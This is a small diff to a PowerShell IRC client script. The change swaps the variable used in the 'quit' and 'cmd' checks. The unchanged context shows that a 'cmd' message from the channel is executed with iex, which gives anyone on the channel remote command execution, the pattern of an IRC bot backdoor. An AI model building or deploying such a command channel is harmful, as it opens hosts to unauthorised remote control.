@@ -55,10 +55,10 @@ Function Connect-IRCServer (
                                     $writer.WriteLine("PRIVMSG $channel $Matches.user : Regex match.")
                                     $writer.Flush()
                                 }
-                        if($Matches.command.Contains("quit")) {
+                        if($command.Contains("quit")) {
                                     return
                                 }
-                        if($Matches.command.Contains("cmd")) {
+                        if($command.Contains("cmd")) {
                                     Write-Host "executing: $args"
                                     $r = iex "$args" | Out-String -Stream
                                     Write-Host $r
